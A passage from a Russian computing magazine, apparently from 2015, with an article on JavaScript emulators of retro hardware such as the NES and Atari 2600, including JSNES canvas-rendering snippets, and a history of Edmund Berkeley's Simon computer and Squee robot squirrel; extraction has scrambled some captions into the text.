 шающихся менять программу на ходу, этот метод не годится. Динамические
 рекомпиляторы перерабатывают программы по частям. Они накапливают ко-
 манды до тех пор, пока не встретят операцию ветвления, после чего компи-
 лируют и исполняют полученный код. В будущем динамический рекомпилятор
 может запускать уже скомпилированные фрагменты кода — это быстрее.
   Такой подход эксплуатирует jsSMS — эмулятор Sega Master System, восьми-
 битного предшественника «Мегадрайва». Разработчик jsSMS утверждает, что
 при помощи динамической рекомпиляции ему удалось ускорить работу про-
 граммы в пять-шесть раз.
   Все просто и понятно? Так и должно быть. JSLinux ничуть не сложнее. Да, он
 вынужден поддерживать больше команд, но сами команды почти столь же пря-
 молинейны, как команды MOS 6502. В конечном счете, для того, чтобы разра-
 ботать такую программу, нужно обладать только железным терпением и болез-
 ненной любовью  к чтению  скучных интеловских спецификаций. Нужное
 сочетание качеств встречается не так уж часто, но если оно есть, достаточно
 строго следовать правилам, и Linux заработает.





 Игровая приставка Sega Master System       Sega Master System использовала процессор
                                          Z80 — такой же, как в ZX Spectrum

  С эмуляцией NES дело обстоит несколько иначе. Смоделировать MOS 6502
 совсем нетрудно, но это не конец, а только начало пути. Когда работаешь с ре-
 трокомпьютерами, прямолинейность спецификаций быстро заканчивается,
 и тогда ты остаешься один на один с хтоническим неевклидовым безумием,
 которое царит за их пределами. Оно чуждо всему, что существует сейчас, но
 его нужно понять, а затем воспроизвести во всех нездоровых и пугающих дета-
 лях — иначе Марио не прыгать.
   Суди сам: в исходниках эмулятора Беллара около семи тысяч строк, шесть
 из которых занимает описание процессора. Это программа, которая способна
 запустить полноценный современный Linux. JSNES тем временем эмулирует
 простенькую приставку тридцатилетней давности, основанную на примитивном
 процессоре с двумя регистрами. Здравый смысл подсказывает, что такой эму-
 лятор обязан быть проще, но ретрокомпьютеры и здравый смысл — понятия
 несовместные. По величине кода JSNES почти не уступает JSLinux, и большая
 его часть не реализует спецификации — она борется с безумием.
   Послушай историю. В сентябре 1977 года компания Atari выпустила домаш-
 ний компьютер под названием Atari 2600. Краткого знакомства с этим леген-
 дарным прибором достаточно для того, чтобы осознать весь ужас ситуации,
 в которой находятся разработчики эмуляторов ретрокомпьютеров.
     Atari 2600 использовала урезанную версию уже знакомого нам процессора
MOS 6502 и обладала оперативной памятью величиной 128 байт (этот абзац
 там не уместился бы — он в три раза длиннее). Кроме того, к устройству можно
 было подключать картриджи с ПЗУ объемом четыре килобайта, а его видеочип
 позволял отображать на телеэкране изображение с разрешением 160 на 190
 пикселей и 128 цветами на пиксель.
   А теперь самое важное: у Atari 2600 не было видеопамяти. 160 на 190 пик-
 селей. 128 цветов. И ни единого байта для того, чтобы их хранить. Как это воз-
 можно?





 Домашний компьютер Atari 2600             Внутренности Atari 2600

   Сейчас 2015 год. Те, кто читает эту статью, скорее всего, не видели теле-
 визора с электронно-лучевой трубкой уже лет десять — а некоторые, вполне
 возможно, и никогда. Это странно, но, боюсь, для того, чтобы объяснить, как
 работало видео Atari 2600, нужно начинать с самого начала — с магнитов.
   Изображение на экране телевизора с электронно-лучевой трубкой — это
 иллюзия. В действительности телевизоры двадцатого века могли заставить
 светиться лишь крохотный участок экрана. Они делали это при помощи пучка
 электронов, который сфокусирован и направлен в нужную точку при помощи
 мощных магнитов. Чтобы построить изображение, электронный пучок с огром-
 ной скоростью бежал по экрану: от верхнего левого к верхнему правому углу,
 затем возвращался налево, опускался чуть ниже, повторял путь к противопо-
 ложному краю, и так до тех пор, пока не достигал самого низа. От того, какой
 сигнал поступает в телевизор, зависела интенсивность пучка и, соответствен-
 но, яркость «пикселей», которых он касается.
   В большинстве компьютеров, появившихся после 1980 года, программист
 надежно отделен от электронных пучков и магнитов несколькими слоями аб-
 стракций. Но Atari 2600 так примитивна, что не может позволить себе такой ро-
 скоши. Луч, бегущий по люминофору, — это главный герой любой программы
 для этой платформы. Разработчикам приходилось непрерывно следить за тем,
 где именно находится луч именно сейчас, чтобы в нужный момент дать команду
 и заставить его зажечь на экране несколько пикселей (на самом деле их задача
 была еще сложнее, но не будем отвлекаться на детали).
   Процессор Atari 2600 не отличался производительностью, поэтому каждое
 действие приходилось отмерять с точностью до такта. Стоит ошибиться на
 долю секунды, и картинки не получится. Это создавало трудновообразимые
 сейчас затруднения и ограничения. Вот пример: на пару команд, загружающих
 из памяти значение, а затем устанавливающих регистр, который задает «цвет»
 луча, уходит пять тактов. За пять тактов луч успевает окрасить пятнадцать пик-
 селей. Следовательно, менять цвет можно не чаще одиннадцати раз на каждой
 строке — и это в том случае, если программа не будет делать ничего, кроме
 изменения цветов.
   Еще не страшно? Сейчас будет: различные телевизионные стандарты под-
 разумевают разную скорость развертки и разное количество кадров в секунду.
 У других платформ об этой разнице заботится видеоадаптер, но с Atari 2600
 так не выйдет. Особенности PAL, SECAM и NTSC рушат тщательно подсчитан-
 ные по продолжительности комбинации команд и заметно влияют на функцио-
 нальность программ. Апокалиптическую картину довершают разработчики игр,
 которые быстро научились применять скудные возможности Atari 2600 не по
 назначению, выжимая из приставки то, на что она по всем формальным при-
 знакам неспособна.
   Эмулятор Atari 2600 должен учитывать все. Он должен знать, с какой скоро-
 стью бежит луч по экрану телевизора. Он должен эмулировать мельчайшие
 особенности телевизионных стандартов. Он должен точно синхронизировать
 движение луча (которого вообще-то нет) с продолжительностью исполнения
 различных команд и задержками, которые вносит электроника Atari 2600, —
 о них, разумеется, в документации ни слова, но игры отлаживались на реаль-
 ном железе и, конечно, развалятся на части, если где-то не хватит микросекун-
 ды. Наконец, эмулятор должен точно имитировать все недостатки и ошибки
 устройства, на которые привыкли полагаться разработчики приложений.

ИГРЫ ДЛЯ ATARI 2600





 Pitfall                        Pete Rose Basebal              Pigs In Space





 Pole Position                  Pompeii                      Q*bert



   Это парадокс: загрузить Linux при помощи JavaScript проще, чем заставить
 работать примитивные доисторические игры. По крайней мере, интерфейс IDE
 и алфавитно-цифровой терминал предсказуемы. Они не зависят от фазы Луны,
 длины бороды программиста и тысячи других факторов. Когда имеешь дело с
 железом, которое придумано больше тридцати лет назад, все наоборот. Нужно
 думать о бесчисленных недокументированных особенностях железа, связанных
 с синхронизацией, графикой и звуком. Именно в этих особенностях — главная
 трудность.
     Atari 2600 — это экстремальный случай, но и в NES хватает сюрпризов. Один
 из вечных источников проблем — картриджи. Дело в том, что картриджи NES
 часто содержали не только ПЗУ с кодом игр, но и нестандартное железо, кото-
 рое могло делать все что угодно. Например, если в картридже нужно уместить
 больше информации, чем позволяет выделенное под него адресное простран-
 ство, в него встраивали специальный чип для переключения банков данных.
 Другие картриджи снабжались энергонезависимыми запоминающими устрой-
 ствами для сохранения отгрузок, а порой — и специальными сопроцессорами.
 Существовали десятки разновидностей картриджей. Каждая из них работала
 по-своему, и, если эмулятор не поддерживает нужную, игра не пойдет.
   Другая трудность связана опять-таки с графикой. За нее в NES отвечал осо-
 бый сопроцессор, работающий с тактовой частотой, которая втрое превыша-
 ла тактовую частоту центрального процессора. Он собирал отображаемое на
 экране изображение из фона и 64 спрайтов величиной 8 на 8 или 8 на 16 пик-
 селей. Программист определял, где хранится спрайт, в какой части экрана его
 следует вывести, нужно ли сдвинуть фон и если нужно, то как. Остальное делал
 сопроцессор.
   На первый взгляд, все просто и удобно — никакого сравнения с видеоадом
 Atari 2600. Но, как известно, свинья грязь найдет. Разработчиков игр не устра-
 ивали недостатки NES. Видеопроцессор приставки начинал сбоить, когда на
 одной строке оказывалось больше восьми спрайтов, и не умел скроллить раз-
 личные части экрана независимо друг от друга. Постепенно программисты на-
 учились обходить эти ограничения. Оказалось, если подменять видеоданные,
 пока видеопроцессор отрисовывает кадр, от него можно добиться большего.
 Беда в том, что эта чудесная идея возвращает нас в мрачное царство телераз-
 вертки и подсчета тактов.
  О преодолении подобных трудностей можно рассуждать вечно. Мы не бу-
 дем это делать, а сосредоточимся на более практических материях: эмуляции
 видеовывода приставки в браузере. JSNES использует для формирования изо-
 бражения тег Canvas:

 self.root = $('<div></div>');
 self.screen = $('<canvas class="nes-screen" width="256"
   height="240"></canvas>').appendTo(self.root);
 self.canvasContext = self.screen[0].getContext('2d');
 self.canvasImageData = self.canvasContext.getImageData(0, 0, 256,
 240);

 Переменная canvasImageData позволяет обращаться к отдельным пикселям
 Canvas. Каждый пиксель описывается четырьмя целыми числами: по одному на
 каждый из трех цветовых компонентов и один — на прозрачность (его можно
 игнорировать).

ИГРЫ ДЛЯ NES





 Игра Castlevania для NES        Chip’n’Dale: Rescue Rangers 2   Duck Hunt





 Super Mario Bros. 3            Teenage Mutant Ninja Turtles III   Sid Meier's Pirates


ГДЕ ИСКАТЬ ЭМУЛЯТОРЫ

 JBacteria
 JBacteria эмулирует ZX Spectrum и представляет со-
 бой джаваскриптовый порт эмулятора Bacteria, ко-
 торый интересен своими крохотными размерами:
 всего четыре килобайта. На сайте JBacteria выло-
 жены десятки игр для «Спектрума», которые можно
 тут же открыть в браузере.

 JS-VBA-M                                          Игра Head Over Heels в эму-
                                                        ляторе JBacteria
 Чтобы запустить этот эмулятор GameBoy Advance,
 придется запастись «ромами» игр с пиратских сай-
 тов. Без них JS-VBA-M работать не будет. Подоб-
 ной тактики придерживаются многие авторы эмуля-
 торов. Они надеются, что таким образом им удастся
 избежать внимания юристов.

 Радио 86-РК
 Этот радиолюбительский компьютер, разработан-
 ный в СССР около тридцати лет назад, построен на  Одна из версий игры
 базе восьмиразрядного микропроцессора КР580В-  Pokemon в эмуляторе
                                                    JS-VBA-M М80А — советского клона Intel 8080. На сайте эму-
 лятора выложены многочисленные игры для РК —
 например, незабвенный «Клад» (Lode Runner).

 Emulators written in JavaScript
 По этой ссылке располагается полнейший каталог
 ретроэмуляторов, написанных на JavaScript. Кроме
 предсказуемых игровых приставок, есть и экзотика:
 эмуляторы PDP-11 и Burroughs B5500, машин, от-
 носящихся к более ранним поколениям вычисли-                                                      Игра «Клад» в эмуляторе
 тельной техники.                                   Радио 86-РК


   За вывод изображения отвечает метод writeFrame. Он получает на входе
 два видеобуфера, один из которых содержит текущий кадр, а другой — прошлый.
 Оба буфера — это обычные массивы JavaScript, но изображение в них хранится
 в несколько другом формате, чем в canvasImageData. Если в canvasImageData
 пиксель состоит из четырех элементов массива, то в buffer и prevBuffer каж-
 дый пиксель — это одно целое число. Цвета закодированы в трех байтах этого
 числа и извлекаются при помощи операции побитового сдвига. Для экономии
 времени это делается только для тех элементов buffer, которые изменились
 по сравнению с prevBuffer. Метод writeFrame заканчивается командой
 putImageData, отображающей сформированное изображение в браузере:

 writeFrame: function(buffer, prevBuffer) {
     var imageData = this.canvasImageData.data;
     var pixel, i, j;
     for (i=0; i<256*240; i++) {
         pixel = buffer[i];
         if (pixel != prevBuffer[i]) {
             j = i*4;
             imageData[j] = pixel & 0xFF;
             imageData[j+1] = (pixel >> 8) & 0xFF;
             imageData[j+2] = (pixel >> 16) & 0xFF;
             prevBuffer[i] = pixel;
         }
     }
     this.canvasContext.putImageData(this.canvasImageData, 0, 0);
 }

 Вот, в принципе, и все. Кроме разбора исходников JSNES, интересующимся
 эмуляцией ретрокомпьютеров при помощи JavaScript можно порекомендовать
 серию статей о разработке джаваскриптового эмулятора GameBoy, которую на-
 писал британский программист Имран Назар. После этого можно вооружаться
 информацией с описанием интересующей платформы (энтузиасты, как прави-
 ло, давно во всем разобрались) и браться за дело. Если страшно, можно начать
 с простого: написать эмулятор какой-нибудь виртуальной машины — скажем,
 байт-кода Z machine. Для того чтобы сделать первый шаг, самое то.
СЦЕНА

   ПРОСТАК SIMON,
    ЭЛЕКТРОБЕЛКА
  И ЗЕМЛЯ БУДУЩЕГО





       КАК ЭДМУНД БЕРКЛИ
    СОЗДАЛ ПЕРВЫХ РОБОТОВ
   И ПРЕДВОСХИТИЛ БУДУЩЕЕ





                                         Евгений Лебеденко
                                                    deardiarylj@gmail.com



Эдмунд Беркли — один из пионеров IT-индустрии.
В пятидесятые годы он разработал компьютер
Simon — Raspberry Pi своего времени. Его исследова-
ния в области робототехники опередили время еще
сильнее: сегодняшние пылесосы Roomba и автомо-
били Google — дальние потомки электробелки Squee,
которую придумал Беркли.

В затемненной комнате, деловито жужжа моторами, суетится странный меха-
низм. Он тщательно осматривает помещение в поисках теннисного мяча, ко-
торый один из добровольцев-зрителей освещает фонариком. Обнаружив его,
механизм мчится за добычей. Ловко подхватив мяч специальным совком, он
быстро разворачивается и несется к своему «гнезду», над которым мигает лам-
почка. «Гнездо» — это металлическая пластина, на которой уже лежат несколь-
ко собранных ранее мячей. Подъехав к своей базе, устройство сбрасывает мяч
из совка и тут же бежит за новой целью. Зрители ликуют, передавая друг другу
новые мячи и фонарик.
  Именно так в конце августа 1951 года на ярмарке штата Миннесота в Минне-
аполисе проходила демонстрация электрической белки Squee, которую создал
коллектив инженеров под руководством Эдмунда Беркли (Edmund Berkeley) —
ученого, изобретателя и неутомимого популяризатора компьютерных техноло-
гий и робототехники.

СТРАХОВАНИЕ, UNIVAC И «МАШИНЫ, КОТОРЫЕ ДУМАЮТ»
Юность Эдмунда Кэллиса Беркли пришлась на двадцатые — тридцатые годы
прошлого столетия — время, когда электротехника двигалась вперед семи-
мильными шагами и пытливый ум физиков все глубже проникал в строение ато-
ма. Казалось, пределов познания истин бытия просто не существует. Именно
эти ощущения в 1930 году наполняли Беркли — молодого выпускника Гарвар-
да, получившего место рядового клерка в нью-йоркском отделении страховой
компании Mutual Life Insurance. Блестящий математик, энергично пытавшийся
привнести в бухгалтерию страховой деятельности что-то новое, Беркли вскоре
заинтересовал руководство старейшей страховой компании США Prudential
Insurance of America, которая искала способы автоматизации делопроизвод-
ства своего бизнеса. С 1934 года Беркли начинает работать в Prudential
Ensurance в качестве руководителя исследовательского отдела.
  Именно в этой должности он впервые знакомится с первыми компьютерами
и энтузиастами их разработки. В 1939 году
воображение  Беркли  поражает  Complex
Number Computer — вычислительная маши-
на для работы с комплексными числами, соз-
данная Джорджем Стибицем (George Stibitz)
в исследовательском центре Bell Labs. Уди-
вительный калькулятор Стибица, бинарная
логика которого базировалась на электро-
механических реле, получал задания для сво-
их расчетов по телефонной линии и распеча-
тывал результаты на телетайпной ленте. За
сложностью разработки и массой пощелки-
вающих реле Беркли увидел возможности
использования   компьютеров  обычными
людьми. Ведь для связи с «электрическим
мозгом» достаточно было сделать простой
телефонный звонок. Именно с этого момен-
                                                Работая клерком страховой компа-
та жизнь Эдмунда Беркли стала неразрывно                                                    нии, Беркли мечтал об автоматиза-
связана с компьютерными технологиями и их  ции своей деятельности
популяризацией.





Работая в Гарварде, Беркли участвовал в создании компьютера MARK II

  Даже Вторая мировая война не смогла сбить Беркли с этого пути. Призван-
ный на службу в военно-морской флот, он в качестве математика попадает
в лабораторию Долгрена (Daulgren Lab), которая занималась баллистически-
ми расчетами для орудий военно-морских судов и береговой артиллерии. Ра-
ботая на ВМФ США, Беркли возвращается в альма-матер — Гарвард, в ис-
следовательский центр Говарда Эйкена (Howard Aiken), где велась разработка
электромеханических вычислителей для нужд флота. Там Беркли знакомится
с MARK I — первенцем компьютеров с гарвардской архитектурой, разработан-
ным коллективом Эйкена и собранным в цехах IBM. Там же он принимает актив-
ное участие в создании MARK II.
   Накопленный Беркли опыт пригодился ему и в послевоенное время, когда
он возвращается к своей работе в Prudential Insurance. В 1946 году для нужд
компании Беркли разрабатывает спецификацию вычислителя, что позволяет
страховой компании заключить государственный контракт с компанией Eckert-
Mauchly Computers, выпускающей компьютеры UNIVAC (преимущественно для
военной области). Деятельность Беркли засекречивается, а это противоречит
его убеждениям о важности доступной информации о компьютерах для любого
человека. Между тем условия контракта с Prudential Insurance запрещают Берк-
ли публиковать какую-либо информацию о своей работе и заниматься чем-ли-
бо, кроме военных проектов.
  Именно эти ограничения приведут к тому, что в 1947 году Эдмунд Беркли
разорвет финансово выгодный для него контракт и откроет собственную кон-
салтинговую компанию Berkeley Associates.
Он привлекает к работе перспективных аспи-
рантов и молодых инженеров.
  В «свободном плавании» Беркли получает
возможность участвовать в социальных про-
ектах, связанных с развитием компьютерной
отрасли. В том же 1947 году он становится
одним из инициаторов создания некоммер-
ческой организации «Восточная ассоциация
вычислительной техники» (EACM — Eastern
Association for Computing Machinery), выпол-
няя функции ее секретаря. Спустя год весьма
эффективного существования EACM преоб-
разуется в ACM (Association for Computing
Machinery) — крупнейший в настоящее время
форум специалистов в области компьютер-
ных наук. Сегодня именно ACM ежегодно
присуждает престижнейшие «программист-
ские» премии Тьюринга и Грейс Хоппер. Под
эгидой этой организации проводятся Между-  Книга Беркли Giant Brains or
                                                 Machines that think, вероятнее всего,
народная студенческая олимпиада по про-                                            была первой научно-популярной
граммированию и знаменитые человеко-ма-  книгой о компьютерах
шинные шахматные турниры.





Объясняя в своей книге принцип работы компьютера,
Беркли прибегал к вполне понятным аналогиям

  Кроме общественной деятельности, свободное предпринимательство по-
зволяет Беркли уделить время написанию книги — она вышла в 1949 году и на-
зывалась «Гигантские мозги, или Машины, которые думают». В ней он в весьма
популярной форме излагает основы бинарной логики, принципы работы вычис-
лителей и типовую архитектуру компьютера. В качестве наглядных примеров
мощи компьютерных технологий Беркли описывает организацию и возможности
компьютеров, с которыми ему посчастливилось познакомиться в Bell Labs, Гар-
варде, Массачусетском технологическом институте и других центрах передовой
научной мысли. Но главной изюминкой книги были не эти могучие вычислители,
а детальное описание чрезвычайно простого компьютера, который сам Беркли
нарек по имени персонажа детских книжек Простак Саймон (Simple Simon).
   Вот как Беркли говорит о нем в своей книге: «...Давайте назовем его „Сай-
мон“, по имени его книжного предшественни-
ка. „Саймон“ настолько прост, что способен
уместиться в продуктовую корзину. Конечно,
может показаться, что модель электромеха-
нического мозга „Саймона“ не имеет ника-
кого практического применения. Между тем
„Саймон“, как и его взрослые собратья, спо-
собен обрабатывать инструкции и выполнять
программы, демонстрируя навыки обучения».
   Книга «Гигантские мозги...» имела боль-
шой успех среди молодежи, увлеченной пер-
спективным  направлением  компьютерных
технологий. У Berkeley Associates не возника-
ло проблем в добровольных помощниках, го-
товых стажироваться у основателя компании,
а выполняемые ей коммерческие проекты
давали неплохую прибыль, которую Беркли
                                       В английском фольклоре
использовал для разработки действующей                                               Простак Саймон сродни нашему
модели компьютера «Саймон».                Ивану-дураку





  Идея работы компьютера
  Simon в книге
   «Гигантские мозги…»
   объясняется на пальцах


SIMPLE SIMON. КОМПЬЮТЕР ДЛЯ КАЖДОГО
Вероятнее всего, «Саймона» можно считать одним из первых, если не самым
первым персональным компьютером с открытой архитектурой и стоимостью
менее тысячи долларов. Его структура, принципы работы и основы программи-
рования были изложены Беркли в тринадцати статьях, опубликованных в 1950–
1951 годах в журнале Radio-Electronics.
  Кроме того, собственными усилиями Беркли редактировал и выпускал бюл-
летень Computers and Automation — видимо, самое первое специализирован-
ное компьютерное издание. Следуя пошаговому руководству в его публикаци-
ях, любой желающий мог собрать своего «простака». Сама же Berkeley Associates
к 1959 году выпустила около четырехсот экземпляров «Саймона», которые были
раскуплены школами и университетами в качестве отличных демонстрацион-
ных пособий для курса компьютерных наук.
   «Саймон» был электромеханическим компьютером с гарвардской архитекту-
рой. Он содержал 129 реле, шаговый переключатель и считыватель стандартной
«пятидырчатой» перфоленты. «Простак» не обладал памятью и получал инструк-
ции и данные с перфоленты или от переключателей на своей передней панели.
Регистры инструкций были четырехбитными, а данных — двухбитными. Ариф-
метико-логическое устройство «Саймона» — его процессор — подключалось
к ним по отдельным двух- и четырехбитной шинам. В качестве устройства выво-
да «Саймон» использовал пять лампочек, расположенных на передней панели.





Первый из тринадцати номеров Radio-Electronics,
в котором рассказывалось о компьютере Simon

                                                         Беркли объясняет
                                                                устройство
                                                           «Саймона»





   «Саймон» интерпретировал программу и данные для нее с предварительно
подготовленной перфоленты, которая протягивалась через его считыватель
вручную в одном направлении. То есть пропустить какие-либо инструкции про-
граммы или организовать операции ветвления в «Саймоне» было невозможно.
Зато программы для «Саймона» предусматривали возможность останова и по-
лучения промежуточных данных, вводимых с помощью переключателей. Скле-
ив перфоленту в кольцо, можно было организовать циклическое выполнение
программы. Очевидно, что этих возможностей «Саймона» хватало только для
того, чтобы ознакомить всех желающих с азами двоичной логики, программи-
рования и устройства электромеханических компьютеров. Однако программы
«Саймона» могли быть и очень сложными, ведь принципиально не было ника-
ких ограничений на длину протягиваемой через его нутро перфоленты.
   Объясняя в шутливой форме уникальность «Саймона», Беркли писал: «При-
обретая его, вы приобретаете, вероятно, самый маленький электрический мозг
в мире, который можно унести в одной руке (а блок питания в другой). Кроме того,
любой владелец Саймона явно будет ощущать себя интеллектуально выше сво-
его приобретения». Интерес, проявленный
к «простаку» Беркли, подвиг его на разработ-
ку его более умных потомков — компьютеров
Geniac, Tyniac, Weeniac и Brainiac.
  Об их устройстве было рассказано в 1952
году в изданной Berkeley Associates брошюре
«Отчет о маленьких роботах» (Small robots
Report). Именно в ней Беркли впервые начи-
нает рассуждать об искусственной жизни. По
его мнению, компьютерные существа вполне
могут стать «живыми»: «...автоматические ма-
шины с органами чувств, мышлением и меха-
низмами взаимодействия. Машины, которые
могут адаптироваться к окружающей среде
и выполнять различные действия в зависимо-
сти от условий, в которых они оказались». Эти
мысли были не пустыми мечтаниями. Беркли
видел, как усилиями таких ученых, как Уолтер
Грей с его «черепахами» и Клод Шеннон с его
«умными» мышами, формируются основы ки-
                                                Руководство по самостоятельной
бернетики — науки, способной сделать циви-                                                 сборке Geniac — другого маленького
лизацию роботов реальностью.                компьютера Беркли





                                                                  Архитектура
                                                               компьютера
                                                               Simon




  Электромеханическое
  реле — основа логики
  компьютера Simon





                     Продолжение статьи
СЦЕНА

   Начало статьи
   ПРОСТАК SIMON,
    ЭЛЕКТРОБЕЛКА
  И ЗЕМЛЯ БУДУЩЕГО



ОТ МЫШИ ФРАНКЕНШТЕЙНА ДО ЭЛЕКТРОБЕЛКИ SQUEE
Беркли заинтересовался поведенческими проблемами компьютеров не слу-
чайно. В 1950 году среди его ассистентов в Berkeley Associates работали бра-
тья Фред и Айвен Сазерленды (Fred Sutherland и Ivan Sutherland). Последний
писал магистерскую работу под руководством самого Клода Шеннона и, ко-
нечно же, привносил идеи своего руководителя в деятельность компании Берк-
ли. Одной из них была идея робота, решающего задачу прохождения лабирин-
та. Подобная конструкция уже была реализована в лаборатории Шеннона,
и Айвен Сазерленд решил, что ее творчески переработанная версия станет
украшением коллекции маленьких роботов Беркли.





Схема памяти мыши «Франкен»

  В 1951 году усилиями шестнадцатилетнего Айвена Сазерленда Berkeley
Associates создает «Франкена» (Franken) — мышь, которая исследовала лаби-
ринт в поисках «пищи». Франкен двигался по полю из тридцати двух квадратов,
на которых перегородками создавался лабиринт.
  Мозг «Франкена» состоял из шестидесяти реле и памяти — маленького
магнитного барабана, способного сохранить 128 двоичных чисел. В ходе де-
монстрации «Франкена» любой желающий мог отметить координаты одного
квадрата как «еду» и еще два квадрата в качестве «замков», открывающих про-
довольственный квадрат. «Франкен» уже «знал», что открыть «продсклад» мож-
но, последовательно попав во второй и первый квадраты-замки. Для их поиска
он исследовал лабиринт. «Франкен» не обладал алгоритмом поиска кратчай-
шего пути, зато был способен запомнить все
тупиковые  ветви. За свою электромышь
юный Айвен Сазерленд получил три тысячи
долларов — премию от Технологического
института Карнеги. Выдавая ее, руководство
института не догадывалось, что премирует
будущего  разработчика  первой  в мире
CAD-системы и создателя первого графиче-
ского пользовательского интерфейса.
  Мышь «Франкен» бегала в ограниченном
пространстве  алюминиевого  лабиринта,
а Беркли мечтал о полностью автономном
роботе. Его восхищала простота реализации
механических черепах английского коллеги
Уолтера Грея, однако он считал, что поведе-
ние автономного робота может быть более
                                       В шестнадцать лет будущий
сложным, чем уклонение от препятствий на                                                 изобретатель GUI Айвен Сазерленд
пути к «дому».                                 стажировался в компании Беркли





Письмо Эдмунда Беркли изобретателю робочерепах Уолтеру Грею





Беркли играет со своей               Устройство Squee напоминает
электробелкой Squee               современные робомобили в миниатюре

   Соратник Беркли Роберт Йенсен так рассказывал об идее разработки бел-
ки Squee: «Мы решили создать робота, который делал бы нечто более „умное“,
чем черепахи Грея. Так родилась идея робота-белки, собирающей „орехи“».
   Белка Squee имела четыре органа восприятия: два глаза-фотоэлемента
и два щупа-контакта, которыми она «ощущала» приближение к своему «гнез-
ду» — металлической пластине. Глаза у Squee были разными. Один из них вос-
принимал непрерывный свет фонарика, которым освещались мячики, имити-
рующие орехи. Другой глаз видел свет стробоскопа, мигающий над «гнездом»
120 раз в секунду, и позволял Squee сориентироваться на пути домой. «Нога-
ми» Squee были колеса, а «лапами» — специально сконструированный лоток,
которым электробелка ловко подхватывала мячик, чтобы отвезти в «гнездо».
   Маленький «мозг» Squee состоял из дюжины ламп и реле. Электробелка с
неизменным успехом демонстрировалась Berkeley Associates в Нью-Йорке,
Питсбурге и Миннеаполисе. Шустрого робота Эдмунда Беркли по самым
скромным подсчетам посмотрело более пятидесяти тысяч человек. Никакой
заумный университетский компьютер не способен был так эффективно пред-
ставить достижения вычислительной техники.

                                                             «Электронная
                                                            зверушка» — так
                                                              в журнале Radio-
                                                                         Electronics была
                                                             представлена Squee





                                                        INFO

                                                                        Аренда маленьких
                                                                            роботов Berkeley
                                                                                       Enterprises стоила от
                                                                      15 до 150 долларов.
                                                              70% этой немалой
                                                                           для пятидесятых сум-
                                                           мы составляла сто-
                                                                          имость материалов
                                                                       и труда сборщиков,
                                                             18% шло на админи-
                                                                           стративные расходы,
                                                                       и только 10% состав-
                                                                                ляла прибыль.





                                                                  Сегодня, спустя
                                                             более чем полвека,
                                                            Squee бодра и
                                                               работоспособна





   Автономность Squee восхищала Беркли. И одновре-
менно заставляла задуматься о будущем, в котором по-
добные белке, но более сложные автономные механизмы
будут «жить» бок о бок с человеком. Еще в своей первой
книге «Гигантские мозги…» главы 11 и 12 Беркли посвятил
вопросам применения компьютеров в будущем и социаль-       INFO
ного контроля над ними. Будучи «технарем», он не фило-
                                                                             Робот-белка Squee
софствовал, а делал прогнозы об областях, в которых ком-                                                                    был создан командой
пьютеры станут доминировать. И прогнозы эти весьма      Эдмунда Беркли
провидческие. Автоматические адресные книги, цифро-       в единственном
                                                                             экземпляре. В концевые библиотеки, компьютерные переводчики и системы                                                                         семидесятых Беркли
распознавания текстов и устной речи.                               подарил Squee
  Воображение Беркли рисует фантастический для на-       Гордону Беллу —
                                                                                 тогда вице-прези-чала пятидесятых мир, в котором компьютеры помогают
                                                                               денту знаменитой
людям предсказывать погоду, управляют домашними бы-                                                                                                     Digital Equipment
товыми приборами, выполняют функции машинисток и      Corporation, а ныне
стенографистов, а также общаются с пользователем на     известному еванге-
                                                                                листу лайфлоггингаестественном языке, помогая быстро отыскать нужную                                                                                     (см. статью «История
информацию в гигантских цифровых библиотеках. «Не-       лайфлоггинга»).
большие карманные компьютеры, оснащенные запомина-     Впоследствии Белл
                                                                           передал отличноющим устройством на магнитной ленте и подключенные к                                                                    функционирующую
радиосети, позволят хранить нужные телефонные номера,                                                                       и по сей день Squee
планировать встречи, организовывать общение с другими     Музею компьютер-
людьми или с большими компьютерами», — так Беркли ви-        ной истории
                                                                                в Маунтин-Вью.
дел наш, наполненный смартфонами и облачными вычис-
лениями, мир. Он рассуждал о многоуровневом компьютерном управлении,
когда одни вычислители контролируют деятельность других. На лужайках перед
домами на «Земле будущего» Беркли трудятся автономные газонокосилки, а
в полях — комбайны без водителей, контролируемые по радио «гигантскими
мозгами» супервычислителей.
   После смерти Эдмунда Беркли в 1988 году в его личном архиве была найде-
на рукопись так и не вышедшей в печать книги «Конструкция живущих роботов»
(The construction of livivng robots). В ней Беркли задумывается о кибернетической
стороне понятия «жизнь» и пытается найти ответы на вопросы об адаптации пол-
ностью автономных роботов к сложным условиям окружающей действительности.
В отличие от фантастических «трех законов робототехники» Азимова, Беркли фор-
мулирует три весьма прагматических закона самосохранения «живого» робота:
1. Он должен избегать столкновения с препятствиями, которые могут нанести
   ему вред.
2. Он не должен уезжать чересчур далеко, поскольку может слишком удалить-
   ся от привычной среды обитания.
3. Он должен периодически возвращаться на «базу», когда
   возникнет нужда в ремонте или подзарядке.

В мире «живых» роботов по Беркли имеются даже компью-
терные варианты смерти и инстинкта размножения. «Чело-
вечество не может позволить, чтобы роботы бесконтрольно
размножались. Почему бы не устроить так, чтобы число ис-    WWW
кусственных существ оставалось неизменным? Представим,                                                                          Архив трудов Эдмун-
что каждый робот поддерживает связь с „родильным домом“.                                                                           да Беркли в библи-
Когда в случае необратимой поломки робот „умирает“, его    отеке университета
связь с „родильным домом“ прерывается и последний про-       Миннесоты
изводит взамен нового робота».                                                                      Информация об
  При этом задумки Беркли — не пустые фантазии. В руко-    «артефакте» Squee
писи на примере незамысловато организованного мира ав-     в Computer History
                                                                      Museumтономных роботов, чрезвычайно напоминающих поведением
робобелку Squee, он в деталях расписывает алгоритмы дей-      Подборка книг
ствий как самих «живых» роботов, так и обслуживающей их    Беркли на Amazon
инфраструктуры: станций ремонта, зарядных станций и фа-
                                                                         Сайт ACM (Ассоциа-
брик — «родильных домов». На базе доступной в пятидеся-                                                                        ции вычислительной
тых схемотехники представлены реализации «рождения»,         техники)
«жизни» и «смерти» роботов.





Рукописи не горят. Но их может подпортить    Мир «живых» роботов по версии Беркли.
время и влажность: найденный экземпляр     Предусмотрено все, от «родильной
«Конструкции живущих роботов»            фабрики» до магазинов

   Наверняка для современников Беркли большинство его футуристических
рассуждений были эксцентричными диковинками, балансирующими на грани
научной фантастики. Но вот его слова, завершающие «Конструкцию живущих
роботов»: «Только ли это голая теория? Кому нужны „живые“ роботы? Начнем с
меня. Мне нужны. В моей небольшой организации сконструирован „маленький
мозг“ Simon и робот-белка Squee, и мы активно работаем над созданием других
роботов. Зачем? Это ведь замечательно — раздвигать горизонты известного.
Это — вызов человеческому воображению. Ну и заодно неплохой бизнес».
